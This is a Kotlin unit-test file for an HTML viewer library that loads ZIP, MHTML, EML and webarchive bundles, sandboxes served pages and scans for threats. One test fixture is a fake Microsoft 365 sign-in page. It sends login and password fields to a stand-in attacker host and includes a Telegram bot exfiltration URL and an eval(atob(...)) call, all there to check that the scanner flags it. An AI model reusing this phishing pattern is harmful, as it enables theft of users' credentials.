package app.htmllens.core

import app.htmllens.core.analysis.ThreatScanner
import app.htmllens.core.analysis.Verdict
import app.htmllens.core.bundle.Bundle
import app.htmllens.core.bundle.BundleCodec
import app.htmllens.core.bundle.BundleKind
import app.htmllens.core.bundle.VFile
import app.htmllens.core.formats.BundleLoader
import app.htmllens.core.formats.Inflater
import app.htmllens.core.formats.InputFile
import app.htmllens.core.formats.ZipWriter
import app.htmllens.core.serve.SandboxMode
import app.htmllens.core.serve.Serve
import app.htmllens.core.serve.ServeConfig
import app.htmllens.core.search.BundleSearch
import app.htmllens.core.tools.Formatter
import app.htmllens.core.tools.LineDiff
import app.htmllens.core.tools.Packer
import app.htmllens.core.tools.ShareLink
import app.htmllens.core.util.B64
import kotlinx.coroutines.test.runTest
import java.io.ByteArrayOutputStream
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.random.Random
import kotlin.test.Test
import kotlin.test.assertContentEquals
import kotlin.test.assertEquals
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

class FormatsTest {

    private fun deflate(data: ByteArray, level: Int): ByteArray {
        val d = Deflater(level, true)
        d.setInput(data); d.finish()
        val out = ByteArrayOutputStream()
        val buf = ByteArray(8192)
        while (!d.finished()) out.write(buf, 0, d.deflate(buf))
        d.end()
        return out.toByteArray()
    }

    @Test
    fun inflateMatchesJdk() {
        val rnd = Random(42)
        val samples = listOf(
            ByteArray(0),
            "hello hello hello hello".toByteArray(),
            ByteArray(200_000) { (it % 251).toByte() },
            ByteArray(100_000) { rnd.nextInt(256).toByte() },
            (1..5000).joinToString(" ") { "<div class=\"item-$it\">Item ${it % 37}</div>" }.toByteArray(),
        )
        for (s in samples) for (level in listOf(0, 1, 6, 9)) {
            assertContentEquals(s, Inflater.inflate(deflate(s, level)), "level $level size ${s.size}")
        }
    }

    @Test
    fun zipBundleWithRelativeAssets() {
        val out = ByteArrayOutputStream()
        ZipOutputStream(out).use { z ->
            fun put(name: String, data: String, stored: Boolean = false) {
                val e = ZipEntry(name)
                if (stored) {
                    val bytes = data.toByteArray()
                    e.method = ZipEntry.STORED; e.size = bytes.size.toLong()
                    e.crc = java.util.zip.CRC32().apply { update(bytes) }.value
                }
                z.putNextEntry(e); z.write(data.toByteArray()); z.closeEntry()
            }
            put("site/index.html", "<html><head><link rel=stylesheet href=css/s.css></head><body><img src='img/a.svg'>Hi ünïcode</body></html>")
            put("site/css/s.css", "body{background:url(../img/a.svg)}", stored = true)
            put("site/img/a.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>")
            put("__MACOSX/site/._index.html", "junk")
        }
        val b = BundleLoader.loadSingle("site.zip", out.toByteArray())
        assertEquals(BundleKind.ZIP, b.kind)
        assertEquals("site/index.html", b.entry)
        assertEquals(3, b.files.size)
        assertNotNull(b.resolve("site/css/../img/a.svg"))
        assertNotNull(b.resolve("SITE/CSS/S.CSS"))
        assertTrue(b.files.getValue("site/index.html").mime.contains("utf-8"))

        val packed = Packer.pack(b)
        assertTrue(packed.html.contains("data:image/svg+xml;base64,"))
        assertTrue(packed.html.contains("<style>"))
        assertTrue(packed.missing.isEmpty(), packed.missing.toString())
    }

    @Test
    fun zipWriterRoundTrip() {
        val zip = ZipWriter.write(listOf("a/index.html" to "<p>x</p>".toByteArray(), "a/b.txt" to "bee".toByteArray()))
        val b = BundleLoader.loadSingle("x.zip", zip)
        assertEquals("a/index.html", b.entry)
        assertEquals("bee", b.files.getValue("a/b.txt").bytes.decodeToString())
        val jdk = java.util.zip.ZipInputStream(zip.inputStream())
        assertEquals("a/index.html", jdk.nextEntry!!.name)
    }

    @Test
    fun mhtmlRewritesResources() {
        val png = B64.encode(byteArrayOf(1, 2, 3, 4))
        val mhtml = """From: <Saved by Blink>
Snapshot-Content-Location: https://example.com/page/
Subject: Example =?utf-8?Q?Caf=C3=A9?=
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--abc----"

------MultipartBoundary--abc----
Content-Type: text/html
Content-ID: <frame-1@mhtml.blink>
Content-Transfer-Encoding: quoted-printable
Content-Location: https://example.com/page/

<html><head><base href=3D"https://example.com/page/"><link rel=3D"stylesheet" href=3D"https://example.com/s.css"></head><body><img src=3D"img/logo.png?v=3D1&amp;x=3D2"><a href=3D"https://other.com/">x</a> Caf=C3=A9</body></html>
------MultipartBoundary--abc----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: https://example.com/s.css

body { background: url("/img/bg.png"); }
------MultipartBoundary--abc----
Content-Type: image/png
Content-Transfer-Encoding: base64
Content-Location: https://example.com/page/img/logo.png?v=1&x=2

$png
------MultipartBoundary--abc----
Content-Type: image/png
Content-Transfer-Encoding: base64
Content-Location: https://example.com/img/bg.png

$png
------MultipartBoundary--abc------
""".replace("\n", "\r\n")
        val b = BundleLoader.loadSingle("page.mhtml", mhtml.toByteArray())
        assertEquals(BundleKind.MHTML, b.kind)
        assertEquals(4, b.files.size)
        val html = b.files.getValue("index.html").bytes.decodeToString()
        assertTrue(html.contains("res/example.com/s.css"), html)
        assertTrue(html.contains("res/example.com/page/img/logo.png"), html)
        assertTrue(html.contains("https://other.com/"), "external links stay untouched")
        assertTrue(!html.contains("<base href"), "base tag removed")
        assertTrue(html.contains("Café"))
        val css = b.files.values.first { it.path.endsWith(".css") }.bytes.decodeToString()
        assertTrue(css.contains("../../res/example.com/img/bg.png") || css.contains("img/bg.png"), css)
        assertEquals("Example Café", b.meta["Title"])
        val logo = b.files.values.first { it.path.contains("logo") }
        assertContentEquals(byteArrayOf(1, 2, 3, 4), logo.bytes)
    }

    @Test
    fun emlWithInlineImageAndAttachment() {
        val img = B64.encode(byteArrayOf(9, 8, 7))
        val pdf = B64.encode("%PDF-1.4 test".toByteArray())
        val eml = """Return-Path: <a@b.com>
From: =?UTF-8?B?Sm9zw6k=?= <jose@example.com>
To: you@example.com
Subject: Invoice
Date: Mon, 1 Jan 2024 10:00:00 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="MIX"

--MIX
Content-Type: multipart/related; boundary="REL"

--REL
Content-Type: multipart/alternative; boundary="ALT"

--ALT
Content-Type: text/plain; charset=utf-8

Plain body
--ALT
Content-Type: text/html; charset=utf-8

<html><body><p>Hello</p><img src="cid:logo123"></body></html>
--ALT--
--REL
Content-Type: image/png
Content-ID: <logo123>
Content-Transfer-Encoding: base64

$img
--REL--
--MIX
Content-Type: application/pdf; name="invoice.pdf"
Content-Disposition: attachment; filename="invoice.pdf"
Content-Transfer-Encoding: base64

$pdf
--MIX--
""".replace("\n", "\r\n")
        val b = BundleLoader.loadSingle("mail.eml", eml.toByteArray())
        assertEquals(BundleKind.EML, b.kind)
        assertEquals("José <jose@example.com>", b.meta["From"])
        assertEquals("Invoice", b.name)
        val html = b.files.getValue("index.html").bytes.decodeToString()
        assertTrue(html.contains("res/cid/logo123.png"), html)
        assertEquals(1, b.attachments.size)
        assertEquals("invoice.pdf", b.attachments[0].name)
        assertTrue(b.attachments[0].bytes.decodeToString().startsWith("%PDF"))
    }

    @Test
    fun threatScannerFlagsPhishingKit() {
        val html = """<html><head><title>Microsoft 365 - Sign in</title></head><body>
            <form action="https://evil.example.net/post.php" method="post">
              <input type="email" name="login"><input type="password" name="passwd"></form>
            <script>var t="https://api.telegram.org/bot123:abc/sendMessage"; eval(atob("YWxlcnQoMSk="));</script>
            </body></html>"""
        val report = ThreatScanner.scan(Bundle.single("x.html", html, BundleKind.HTML))
        assertEquals(Verdict.DANGEROUS, report.verdict)
        assertTrue(report.findings.any { it.title.contains("Telegram") })
        assertTrue(report.externalDomains.contains("evil.example.net"))

        val clean = ThreatScanner.scan(Bundle.single("y.html", "<html><body><h1>Hello</h1><p>Text</p></body></html>"))
        assertEquals(Verdict.CLEAN, clean.verdict)
    }

    @Test
    fun serveInjectsBridgeAfterHeadAndBlocksRefresh() {
        val html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=https://x.com\"><title>t</title></head><body>x</body></html>"
        val cfg = ServeConfig(SandboxMode.SAFE, "abc123", "web")
        val out = Serve.transformHtml(html.toByteArray(), "text/html; charset=utf-8", cfg).decodeToString()
        assertTrue(out.startsWith("<!DOCTYPE html><html><head><script src=\"/__hv/bridge.js?t=web&m=safe&n=abc123"), out)
        assertTrue(out.contains("nonce=\"abc123\""))
        assertTrue(out.contains("x-refresh-blocked"))
        assertTrue(Serve.csp(cfg)!!.contains("script-src 'nonce-abc123'"))

        val dark = Serve.transformHtml("<style>@media (prefers-color-scheme: dark){body{color:#fff}}</style>".toByteArray(), "text/html",
            ServeConfig(SandboxMode.FULL, "n", "cef", darkSim = true)).decodeToString()
        assertTrue(dark.contains("min-width:0px"))
    }

    @Test
    fun formatterAndDiff() {
        val pretty = Formatter.beautify("<div><p>a</p><p>b</p></div>")
        assertTrue(pretty.contains("\n  <p>a</p>"), pretty)
        val min = Formatter.minify("<html><head><style> body { color : red ; } </style></head><body>\n\n  <p>a   b</p> <!-- c --></body></html>")
        assertTrue(min.contains("body{color:red}"), min)
        assertTrue(!min.contains("<!--"))
        val d = LineDiff.diff("a\nb\nc", "a\nx\nc")
        assertEquals(LineDiff.Stats(1, 1), LineDiff.stats(d))
    }

    @Test
    fun shareLinkRoundTrip() = runTest {
        val html = "<h1>Hello 🌍</h1>" + "<p>lorem ipsum</p>".repeat(200)
        val url = ShareLink.buildUrl("https://htmllens.app/app/", html, "My page")
        val fragment = url.substringAfter('#')
        val parsed = ShareLink.parseFragment(fragment)!!
        assertEquals("My page", parsed.first)
        assertEquals(html, parsed.second)
        assertTrue(url.length < html.length / 3)
    }

    @Test
    fun bundleCodecAndSearch() = runTest {
        val b = Bundle(
            "chat", BundleKind.FOLDER,
            listOf(
                VFile("messages.html", "<div id='message1'><div class='text'>Hello world</div></div>".toByteArray(), "text/html"),
                VFile("messages2.html", "<div id='message77'><div class='text'>Another WORLD here</div></div>".toByteArray(), "text/html"),
            ),
        )
        val restored = BundleCodec.decode(BundleCodec.encode(b))
        assertEquals(b.files.keys, restored.files.keys)
        val hits = BundleSearch.search(restored, "world")
        assertEquals(listOf("message1", "message77"), hits.map { it.anchor })
    }

    @Test
    fun webArchiveBinaryAndXml() {
        for (name in listOf("sample.webarchive", "sample-xml.webarchive")) {
            val bytes = javaClass.classLoader.getResourceAsStream(name)!!.readBytes()
            val b = BundleLoader.loadSingle(name, bytes)
            assertEquals(BundleKind.WEBARCHIVE, b.kind, name)
            assertEquals(3, b.files.size, name)
            val html = b.files.getValue("index.html").bytes.decodeToString()
            assertTrue(html.contains("res/example.com/dir/style.css"), html)
            assertTrue(html.contains("res/cdn.example.com/a.png"), html)
            assertEquals("https://example.com/dir/page.html", b.meta["Original URL"])
        }
    }

    @Test
    fun folderLoad() {
        val b = BundleLoader.load("report", listOf(
            InputFile("report/index.html", "<a href='sub/page.html'>x</a>".toByteArray()),
            InputFile("report/sub/page.html", "<p>y</p>".toByteArray()),
        ))
        assertEquals(BundleKind.FOLDER, b.kind)
        assertEquals("report/index.html", b.entry)
    }
}
